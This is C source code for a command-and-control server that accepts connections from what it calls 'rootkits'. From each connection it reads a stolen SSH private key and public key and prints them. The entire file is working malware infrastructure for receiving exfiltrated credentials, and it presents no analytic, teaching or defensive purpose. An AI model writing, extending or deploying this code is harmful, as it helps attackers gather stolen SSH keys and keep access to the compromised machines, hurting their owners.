#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <math.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <assert.h>
#include <endian.h>
#include "cnc.h"

static const int MAXROOTKITS = 32767; //maximum rootkits allowed in queue

void handle_rootkit(int rootkitSocket) {
    while (4==4){

        ssize_t bytesFromClient;

        //Private Key
        char sshData[2635]; //Add 1 for null byte, actually 2635 + 1
        int sshSum = 0;
        int sshDataBufferCount = 0;

        while (sshSum < 2635){
            char sshDataTempBuffer[4];
            bytesFromClient = recv(rootkitSocket, sshDataTempBuffer, 4, 0);
            sshSum += bytesFromClient;

            for (int t = 0; t < bytesFromClient; t++){
                sshData[sshDataBufferCount++] = sshDataTempBuffer[t];
            }
        }
        sshData[2634] = '\0';
        printf("%s\n", sshData);

        char random[2];
        bytesFromClient = recv(rootkitSocket, random, 2, 0);

        //Public Key
        char sshDataPublic[595]; //Add 1 for null byte actually 595 chars
        int sshSumPublic = 0;
        int sshDataBufferCountPublic = 0;

        while (sshSumPublic < 595){

            char sshDataTempBufferPublic[4];
            bytesFromClient = recv(rootkitSocket, sshDataTempBufferPublic, 4, 0);
            sshSumPublic += bytesFromClient;

            for (int t = 0; t < bytesFromClient; t++){
                sshDataPublic[sshDataBufferCountPublic++] = sshDataTempBufferPublic[t];
            }
        }
        sshDataPublic[594] = '\0';
        printf("%s\n", sshDataPublic);
        
        bytesFromClient = recv(rootkitSocket, random, 2, 0);
    }
    
}

int main(int argc, char *argv[]){

    fflush(stdout);

    struct sockaddr_in cncAddress;
    memset(&cncAddress, 0, sizeof(cncAddress));
    cncAddress.sin_family = AF_INET;
    cncAddress.sin_addr.s_addr = htonl(INADDR_ANY);
    cncAddress.sin_port = htons(9024);

    //Create a socket
    int cncSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    assert(cncSocket >= 0);

    //Bind to the socket
    int bindSocket = bind(cncSocket, (struct sockaddr *) &cncAddress, sizeof(cncAddress));
    assert(bindSocket >= 0);

    //Start listening to the port
    int listenSocket = listen(cncSocket, MAXROOTKITS);
    assert(listenSocket >= 0);

    while (4 == 4){
        struct sockaddr_in rootkitAddress;
        socklen_t rootkitAddressLength = sizeof(rootkitAddress);

        //Wait for a rootkit to connect to the cnc
        int rootkitSocket = accept(cncSocket, (struct sockaddr *) &rootkitAddress, &rootkitAddressLength);
        assert(rootkitSocket >= 0);

        //Connecting and handling a rootkit
        char rootkitIP[INET_ADDRSTRLEN];
        if (inet_ntop(AF_INET, &rootkitAddress.sin_addr.s_addr, rootkitIP, sizeof(rootkitIP)) != NULL) {
            printf("Handling rootkit %s/%d\n", rootkitIP, ntohs(rootkitAddress.sin_port));
        }
        else {
            printf("Unable to get the rootkit's address");
        }

        handle_rootkit(rootkitSocket);
    }

}
